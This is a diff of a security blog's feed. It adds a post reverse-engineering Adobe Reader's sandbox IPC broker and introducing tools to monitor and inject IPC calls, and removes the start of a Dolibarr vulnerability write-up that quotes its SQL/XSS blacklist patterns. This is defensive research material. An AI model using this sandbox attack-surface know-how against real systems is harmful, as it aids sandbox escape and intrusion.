+<p>Once the <code>CrossCallParams</code> structure has been written out, the sandboxed process signals the <code>ping_event</code> and the broker is triggered.</p>
+
+<p>Broker side handling is fairly straightforward. The server registers a <code>ping_event</code> handler during <code>SharedMemIPCServer::Init</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> thread_provider_-&gt;RegisterWait(this, service_context-&gt;ping_event,
+</span><span class='line'>                                ThreadPingEventReady, service_context);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/win2k_threadpool.cc#L11"><code>RegisterWait</code></a> is just a thread pool wrapper around a call to <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-registerwaitforsingleobject"><code>RegisterWaitForSingleObject</code></a>.</p>
+
+<p>The <code>ThreadPingEventReady</code> function marks the channel as <code>kAckChannel</code>, fetches a pointer to the provided buffer, and invokes <code>InvokeCallback</code>. Once this
+returns, it copies the <code>CrossCallReturn</code> structure back to the channel and signals the <code>pong_event</code> mutex.</p>
+
+<p><code>InvokeCallback</code> parses out the buffer and handles validation of data, at a high level (ensures strings are strings, buffers and sizes match up, etc.). This is probably a good time to document the supported argument types. There are 10 types in total, two of which are placeholder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ArgType = {
+</span><span class='line'>    0: "INVALID_TYPE",
+</span><span class='line'>    1: "WCHAR_TYPE", 
+</span><span class='line'>    2: "ULONG_TYPE",
+</span><span class='line'>    3: "UNISTR_TYPE", # treated same as WCHAR_TYPE
+</span><span class='line'>    4: "VOIDPTR_TYPE",
+</span><span class='line'>    5: "INPTR_TYPE",
+</span><span class='line'>    6: "INOUTPTR_TYPE",
+</span><span class='line'>    7: "ASCII_TYPE",
+</span><span class='line'>    8: "MEM_TYPE", 
+</span><span class='line'>    9: "LAST_TYPE" 
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>These are taken from <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/internal_types.h#L16"><code>internal_types</code></a>,
+but you&rsquo;ll notice there are two additional types: <code>ASCII_TYPE</code> and <code>MEM_TYPE</code>, and are unique to Reader. <code>ASCII_TYPE</code> is, as expected, a simple 7bit ASCII string. <code>MEM_TYPE</code> is a memory structure used by the broker to read
+data out of the sandboxed process, ie. for more complex types that can&rsquo;t be trivially passed via the API. It&rsquo;s additionally used for data blobs, such as PNG images, enhanced-format datafiles, and more.</p>
+
+<p>Some of these types should be self-explanatory; <code>WCHAR_TYPE</code> is naturally a wide char, <code>ASCII_TYPE</code> an ascii string, and <code>ULONG_TYPE</code> a ulong. Let&rsquo;s look at a few of the non-obvious types, however: <code>VOIDPTR_TYPE</code>, <code>INPTR_TYPE</code>, <code>INOUTPTR_TYPE</code>, and <code>MEM_TYPE</code>.</p>
+
+<p>Starting with <code>VOIDPTR_TYPE</code>, this is a standard type in the Chromium sandbox so we can just refer to the source code. <a href="https://github.com/adobe/chromium/blob/master/sandbox/src/sharedmem_ipc_server.cc#L181"><code>SharedMemIPCServer::GetArgs</code></a> calls <code>GetParameterVoidPtr</code>. Simply, once the value itself is extracted it&rsquo;s cast to a void ptr:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>*param = *(reinterpret_cast&lt;void**&gt;(start));</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This allows tags to reference objects and data within the broker process itself. An example might be <code>NtOpenProcessToken</code>, whose first parameter is a handle to the target process. This would be retrieved first by a call to <code>OpenProcess</code>, handed back to the child process, and then supplied in any future calls that may need to use the handle as a <code>VOIDPTR_TYPE</code>.</p>
+
+<p>In the Chromium source code, <code>INPTR_TYPE</code> is extracted as a raw value via <code>GetRawParameter</code> and no additional processing is performed. However, in Adobe Reader, it&rsquo;s actually extracted in the same way <code>INOUTPTR_TYPE</code> is.</p>
+
+<p><code>INOUTPTR_TYPE</code> is wrapped as a <a href="https://github.com/adobe/chromium/blob/master/sandbox/src/internal_types.h#L28"><code>CountedBuffer</code></a> and may be written to during the IPC call. For example, if <code>CreateProcessW</code> is invoked, the <code>PROCESS_INFORMATION</code> pointer will be of type <code>INOUTPTR_TYPE</code>.</p>
+
+<p>The final type is <code>MEM_TYPE</code>, which is unique to Adobe Reader. We can define the structure as:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct MEM_TYPE {
+</span><span class='line'>  HANDLE hProcess;
+</span><span class='line'>  DWORD lpBaseAddress;
+</span><span class='line'>  SIZE_T nSize;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As mentioned, this type is primarily used to transfer data buffers to and from the broker process. It seems crazy. Each tag is responsible for performing its own validation of the provided values before they&rsquo;re used in any <code>ReadProcessMemory/WriteProcessMemory</code> call.</p>
+
+<p>Once the broker has parsed out the passed arguments, it fetches the context dispatcher and identifies our tag handler:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ContextDispatcher = *(int (__thiscall ****)(_DWORD, int *, int *))(Context + 24);// fetch dispatcher function from Server control
+</span><span class='line'>target_info = Context + 28;
+</span><span class='line'>handler = (**ContextDispatcher)(ContextDispatcher, &ipc_params, &callback_generic);// PolicyBase::OnMessageReady</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The handler is fetched from
+<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/sandbox_policy_base.cc#L374"><code>PolicyBase::OnMessageReady</code></a>,
+which winds up calling
+<a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_server.cc#L268"><code>Dispatcher::OnMessageReady</code></a>.
+This is a pretty simple function that crawls the registered IPC tag list for
+the correct handler. We finally hit <code>InvokeCallbackArgs</code>, unique to Reader,
+which invokes the handler with the proper argument count:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>switch ( ParamCount )
+</span><span class='line'>  {
+</span><span class='line'>    case 0:
+</span><span class='line'>      v7 = callback_generic(_this, CrossCallParamsEx);
+</span><span class='line'>      goto LABEL_20;
+</span><span class='line'>    case 1:
+</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD))callback_generic)(_this, CrossCallParamsEx, *args);
+</span><span class='line'>      goto LABEL_20;
+</span><span class='line'>    case 2:
+</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD, _DWORD))callback_generic)(_this, CrossCallParamsEx, *args, args[1]);
+</span><span class='line'>      goto LABEL_20;
+</span><span class='line'>    case 3:
+</span><span class='line'>      v7 = ((int (__thiscall *)(void *, int, _DWORD, _DWORD, _DWORD))callback_generic)(
+</span><span class='line'>             _this,
+</span><span class='line'>             CrossCallParamsEx,
+</span><span class='line'>             *args,
+</span><span class='line'>             args[1],
+</span><span class='line'>             args[2]);
+</span><span class='line'>      goto LABEL_20;
+</span><span class='line'>
+</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In total, Reader supports tag functions with up to 17 arguments. I have no idea why that would be necessary, but it is. Additionally note the first two arguments to each tag handler: context handler (dispatcher) and <code>CrossCallParamsEx</code>. This last structure is actually the broker&rsquo;s version of a <code>CrossCallParams</code> with more paranoia.</p>
+
+<p>A single function is used to register IPC tags, called from a single initialization function, making it relatively easy for us to scrape them all at runtime. Pulling out all of the IPC tags can be done both statically and dynamically; the former is far easier, the latter is more accurate. I&rsquo;ve implemented a static generator using IDAPython, available in this project&rsquo;s repository (<code>ida_find_tags.py</code>), and can be used to pull all supported IPC tags out of Reader along with their parameters. This is not going to be wholly indicative of all possible calls, however. During initialization of the sandbox, many feature checks are performed to probe the availability of certain capabilities. If these fail, the tag is not registered.</p>
+
+<p>Tags are given a handle to <code>CrossCallParamsEx</code>, which gives them access to the <code>CrossCallReturn</code> structure. This is <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/crosscall_params.h#L79">defined here</a> and, repeated from above, defined as:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>struct CrossCallReturn {
+</span><span class='line'>  uint32 tag_;
+</span><span class='line'>  uint32 call_outcome;
+</span><span class='line'>  union {
+</span><span class='line'>    NTSTATUS nt_status;
+</span><span class='line'>    DWORD win32_result;
+</span><span class='line'>  };
+</span><span class='line'>
+</span><span class='line'>  HANDLE handle;
+</span><span class='line'>  uint32 extended_count;
+</span><span class='line'>  MultiType extended[kExtendedReturnCount];
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This 52 byte structure is embedded in the <code>CrossCallParams</code> transferred by the sandboxed process. Once the tag has returned from execution, the following occurs:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> if (error) {
+</span><span class='line'>    if (handler)
+</span><span class='line'>      SetCallError(SBOX_ERROR_FAILED_IPC, call_result);
+</span><span class='line'>  } else {
+</span><span class='line'>    memcpy(call_result, &ipc_info.return_info, sizeof(*call_result));
+</span><span class='line'>    SetCallSuccess(call_result);
+</span><span class='line'>    if (params-&gt;IsInOut()) {
+</span><span class='line'>      // Maybe the params got changed by the broker. We need to upadte the
+</span><span class='line'>      // memory section.
+</span><span class='line'>      memcpy(ipc_buffer, params.get(), output_size);
+</span><span class='line'>    }
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and the sandboxed process can finally read out its result. Note that this mechanism does not allow for the exchange of more complex types, hence the availability of <code>MEM_TYPE</code>. The final step is signaling the <code>pong_event</code>, completing the call and freeing the channel.</p>
+
+<h3>Tags</h3>
+
+<p>Now that we understand how the IPC mechanism itself works, let&rsquo;s examine the implemented tags in the sandbox. Tags are registered during initialization by a function we&rsquo;ll call <code>InitializeSandboxCallback</code>. This is a large function that handles allocating sandbox tag objects and invoking their respective initalizers. Each initializer uses a function, <code>RegisterTag</code>, to construct and register individual tags. A tag is defined by a <code>SandTag</code> structure:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>typedef struct SandTag {
+</span><span class='line'>  DWORD IPCTag;
+</span><span class='line'>  ArgType Arguments[17];
+</span><span class='line'>  LPVOID Handler;
+</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>Arguments</code> array is initialized to <code>INVALID_TYPE</code> and ignored if the tag does not use all 17 slots. Here&rsquo;s an example of a tag structure:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.rdata:00DD49A8 IpcTag3         dd 3                    ; IPCTag
+</span><span class='line'>.rdata:00DD49A8                                         ; DATA XREF: 000190FA↑r
+</span><span class='line'>.rdata:00DD49A8                                         ; 00019140↑o ...
+</span><span class='line'>.rdata:00DD49A8                 dd 1, 6 dup(2), 0Ah dup(0); Arguments
+</span><span class='line'>.rdata:00DD49A8                 dd offset FilesystemDispatcher__NtCreateFile; Handler</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we see tag 3 with 7 arguments; the first is <code>WCHAR_TYPE</code> and the remaining 6 are <code>ULONG_TYPE</code>. This lines up with what know to be the <a href="https://github.com/adobe/chromium/blob/cfe5bf0b51b1f6b9fe239c2a3c2f2364da9967d7/sandbox/src/filesystem_dispatcher.cc#L22">NtCreateFile tag handler</a>.</p>
+
+<p>Each tag is part of a group that denotes its behavior. There are 20 groups in total:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SandboxFilesystemDispatcher
+</span><span class='line'>SandboxNamedPipeDispatcher
+</span><span class='line'>SandboxProcessThreadDispatcher
+</span><span class='line'>SandboxSyncDispatcher
+</span><span class='line'>SandboxRegistryDispatcher
+</span><span class='line'>SandboxBrokerServerDispatcher
+</span><span class='line'>SandboxMutantDispatcher
+</span><span class='line'>SandboxSectionDispatcher
+</span><span class='line'>SandboxMAPIDispatcher
+</span><span class='line'>SandboxClipboardDispatcher
+</span><span class='line'>SandboxCryptDispatcher
+</span><span class='line'>SandboxKerberosDispatcher
+</span><span class='line'>SandboxExecProcessDispatcher
+</span><span class='line'>SandboxWininetDispatcher
+</span><span class='line'>SandboxSelfhealDispatcher
+</span><span class='line'>SandboxPrintDispatcher
+</span><span class='line'>SandboxPreviewDispatcher
+</span><span class='line'>SandboxDDEDispatcher
+</span><span class='line'>SandboxAtomDispatcher
+</span><span class='line'>SandboxTaskbarManagerDispatcher</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The names were extracted either from the Reader binary itself or through correlation with Chromium. Each dispatcher implements an initialization routine that invokes <code>RegisterDispatchFunction</code> for each tag. The number of registered tags will differ depending on the installation, version, features, etc. of the Reader process. <code>SandboxBrokerServerDispatcher</code>, for example, can have a sway of approximately 25 tags.</p>
+
+<p>Instead of providing a description of each dispatcher in this post, I&rsquo;ve instead put together a separate page, which can be found <a href="http://hatRiot.github.io/other/adobe-reader-tags.html">here</a>. This page can be used as a tag reference and has some general information about each. Over time I&rsquo;ll add my notes on the calls. I&rsquo;ve additionally pushed the scripts used to extract tag information from the Reader binary and generate the table to the <code>sander</code> repository detailed below.</p>
+
+<h3>libread</h3>
+
+<p>Over the course of this research, I developed a library and set of tools for examining and exercising the Reader sandbox. The library, <code>libread</code>, was developed to programmatically interface with the broker in real time,
+allowing for quickly exercising components of the broker and dynamically reversing various facilities. In addition, the library was critical during my fuzzing expeditions. All of the fuzzing tools and data will be available in the next post in this series.</p>
+
+<p><code>libread</code> is fairly flexible and easy to use, but still pretty rudimentary and, of course, built off of my reverse engineering efforts. It won&rsquo;t be feature complete nor even completely accurate. Pull requests are welcome.</p>
+
+<p>The library implements all of the notable structures and provides a few helper functions for locating the <code>ServerControl</code> from the broker process. As we&rsquo;ve seen, a <code>ServerControl</code> is a broker&rsquo;s view of a channel and it is held by the broker alone. This means it&rsquo;s not somewhere predictable in shared memory and we&rsquo;ve got to scan the broker&rsquo;s memory hunting it. From the sandbox side there is also a <code>find_memory_map</code> helper for locating the base address of the shared memory map.</p>
+
+<p>In addition to this library I&rsquo;m releasing <code>sander</code>. This is a command line tool that consumes <code>libread</code> to provide some useful functionality for inspecting the sandbox:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sander.exe -h
+</span><span class='line'>[-] sander: [action] &lt;pid&gt;
+</span><span class='line'>          -m   -  Monitor mode
+</span><span class='line'>          -d   -  Dump channels
+</span><span class='line'>          -t   -  Trigger test call (tag 62)
+</span><span class='line'>          -c   -  Capture IPC traffic and log to disk
+</span><span class='line'>          -h   -  Print this menu</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The most useful functionality provided here is the <code>-m</code> flag. This allows one to monitor the IPC calls and their arguments in real time:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ sander.exe -m 6132
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 266 1 Parameters
+</span><span class='line'>      WCHAR_TYPE: _WVWT*&^$
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 34  1 Parameters
+</span><span class='line'>      WCHAR_TYPE: C:\Users\bja\desktop\test.pdf
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 247 2 Parameters
+</span><span class='line'>      WCHAR_TYPE: C:\Users\bja\desktop\test.pdf
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 16  6 Parameters
+</span><span class='line'>      WCHAR_TYPE: Software\Adobe\Acrobat Reader\DC\SessionManagement
+</span><span class='line'>      ULONG_TYPE: 00000040
+</span><span class='line'>      VOIDPTR_TYPE: 00000434
+</span><span class='line'>      ULONG_TYPE: 000f003f
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>[6020] ESP: 037dfca4    Buffer 029f0134 Tag 16  6 Parameters
+</span><span class='line'>      WCHAR_TYPE: cWindowsCurrent
+</span><span class='line'>      ULONG_TYPE: 00000040
+</span><span class='line'>      VOIDPTR_TYPE: 0000043c
+</span><span class='line'>      ULONG_TYPE: 000f003f
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 16  6 Parameters
+</span><span class='line'>      WCHAR_TYPE: cWin0
+</span><span class='line'>      ULONG_TYPE: 00000040
+</span><span class='line'>      VOIDPTR_TYPE: 00000434
+</span><span class='line'>      ULONG_TYPE: 000f003f
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>      ULONG_TYPE: 00000000
+</span><span class='line'>[5184] ESP: 02e1f764    Buffer 029f0134 Tag 17  4 Parameters
+</span><span class='line'>      WCHAR_TYPE: cTab0
+</span><span class='line'>      ULONG_TYPE: 00000040
+</span><span class='line'>      VOIDPTR_TYPE: 00000298
+</span><span class='line'>      ULONG_TYPE: 000f003f
+</span><span class='line'>[2572] ESP: 0335fd5c    Buffer 029f0134 Tag 17  4 Parameters
+</span><span class='line'>      WCHAR_TYPE: cPathInfo
+</span><span class='line'>      ULONG_TYPE: 00000040
+</span><span class='line'>      VOIDPTR_TYPE: 000003cc
+</span><span class='line'>      ULONG_TYPE: 000f003f</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;re also able to dump all IPC calls in the brokers&#8217; channels (<code>-d</code>), which can help debug threading issues when fuzzing, and trigger a test IPC call (<code>-t</code>). This latter function demonstrates how to send your own IPC calls via <code>libread</code> as well as allows you to test out additional tooling.</p>
+
+<p>The last available feature is the <code>-c</code> flag, which captures all IPC traffic and logs the channel buffer to a file on disk. I used this primarily to seed part of my corpus during fuzzing efforts, as well as aid during some reversing efforts. It&rsquo;s extremely useful for replaying requests and gathering a baseline corpus of real traffic. We&rsquo;ll discuss this further in forthcoming posts.</p>
+
+<p>That about concludes this initial post. Next up I&rsquo;ll discuss the various fuzzing strategies used on this unique interface, the frustrating amount of failure, and the bugs shooken out.</p>
+
+<h3>Resources</h3>
+
+<ul>
+<li><a href="https://github.com/hatRiot/sander">Sander</a></li>
+<li><a href="https://github.com/hatRiot/libread">libread</a></li>
+<li><a href="http://hatRiot.github.io/other/adobe-reader-tags.html">Sandbox tag table</a></li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Exploiting Leaked Process and Thread Handles]]></title>
@@ -6258,510 +7223,6 @@ Their analytics status/server monitoring application is vulnerable to a fairly t
 <p>Judging by this information, it doesn&rsquo;t appear that we can remotely invoke the same way we did with 3.x/4.x.  This is the fundamental issue with several of the available open source JBoss tools (Metasploit); none of them take into account the changes between different versions of JBoss.</p>
 
 <p>Although I have yet to discover a way to map requests to the invoker (I&rsquo;m not entirely sure its possible) in these later versions, I have a suspicion that we may be able to map these requests by serializing objects out.  More on this, and my exploitation tool, soon.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Dolibarr 3.4.0 - Multiple Vulnerabilities]]></title>
-    <link href="http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/"/>
-    <updated>2013-10-14T22:13:15-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities</id>
-    <content type="html"><![CDATA[<p><a href="http://www.dolibarr.org/">Dolibarr</a> is an open source, enterprise-grade ERP/CRM application developed in PHP.  The latest stable release, 3.4.0, is vulnerable to a host of remotely exploitable post and pre auth vulnerabilities, along with several seriously mind-bending security/architecture choices.  These vulnerabilities and issues were privately disclosed to the vendor, and the SQLi was patched in version 3.4.1.  However, their sanitization methods were not fixed, and no mention was made on a future patch.  Other SQLi vectors are likely.</p>
-
-<p>There are multiple SQL injections that lead to a compromise of the availability/integrity of the database or web server.  The scenario and context of the vulnerabilities are rather interesting, as multiple blacklisting techniques are used by Dolibarr in an attempt to mitigate malicious queries slipping through; nevertheless, as we know, blacklisting never works.  No parameterized queries are to be found in source.</p>
-
-<p>The following is included in each page and used for &ldquo;sanitization&rdquo; <code>main.inc.php</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>function analyse_sql_and_script(&$var, $type)
-</span><span class='line'>{
-</span><span class='line'>    if (is_array($var))
-</span><span class='line'>    {
-</span><span class='line'>        foreach ($var as $key =&gt; $value)
-</span><span class='line'>        {
-</span><span class='line'>            if (analyse_sql_and_script($value,$type))
-</span><span class='line'>            {
-</span><span class='line'>                $var[$key] = $value;
-</span><span class='line'>            }
-</span><span class='line'>            else
-</span><span class='line'>            {
-</span><span class='line'>                print 'Access refused by SQL/Script injection protection in main.inc.php';
-</span><span class='line'>                exit;
-</span><span class='line'>            }
-</span><span class='line'>        }
-</span><span class='line'>        return true;
-</span><span class='line'>    }
-</span><span class='line'>    else
-</span><span class='line'>    {
-</span><span class='line'>        return (test_sql_and_script_inject($var,$type) &lt;= 0);
-</span><span class='line'>    }
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>function test_sql_and_script_inject($val, $type)
-</span><span class='line'>{
-</span><span class='line'>    $sql_inj = 0;
-</span><span class='line'>    // For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
-</span><span class='line'>    if ($type != 2)
-</span><span class='line'>    {
-</span><span class='line'>        $sql_inj += preg_match('/delete[\s]+from/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/create[\s]+table/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/update.+set.+=/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/insert[\s]+into/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/select.+from/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/union.+select/i', $val);
-</span><span class='line'>        $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
-</span><span class='line'>    }
-</span><span class='line'>    // For XSS Injection done by adding javascript with script
-</span><span class='line'>    // This is all cases a browser consider text is javascript:
-</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
-</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
-</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
-</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
-</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
-</span><span class='line'>    if ($type == 1)
-</span><span class='line'>    {
